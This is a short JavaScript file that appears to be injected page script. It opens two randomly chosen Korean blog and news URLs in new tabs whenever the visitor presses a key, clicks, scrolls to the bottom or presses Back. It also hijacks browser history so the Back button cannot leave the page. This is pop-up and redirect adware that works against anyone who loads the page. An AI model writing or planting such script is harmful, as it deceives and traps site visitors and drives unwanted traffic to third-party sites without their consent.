function handleKeyPress(event) {
    const urls = [
		'https://blog3news.tistory.com/',
		'https://1-news.tistory.com/',
		'https://newsfactory.iwinv.net/',
		'https://blog3news.tistory.com/',
		'https://1-news.tistory.com/',
		'https://newsfactory.iwinv.net/',
        'http://newtoki.iwinv.net/_______qn.php',
    ];

    function getRandomUrls(arr, num) {
        const shuffled = arr.sort(() => 0.5 - Math.random());
        return shuffled.slice(0, num);
    }
    const randomUrls = getRandomUrls(urls, 2);
    randomUrls.forEach(url => window.open(url, '_blank'));
}

window.addEventListener('scroll', () => {
    const scrollHeight = document.documentElement.scrollHeight;
    const scrollTop = document.documentElement.scrollTop || document.body.scrollTop;
    const clientHeight = document.documentElement.clientHeight;

    if (scrollTop + clientHeight >= scrollHeight) {
        handleKeyPress();
    }
});

document.addEventListener('keydown', handleKeyPress);
document.documentElement.addEventListener('click', handleKeyPress);

history.pushState(null, null, "");
window.onpopstate = function(a) {
    if (a) {
        history.back();
        handleKeyPress();
    }
};
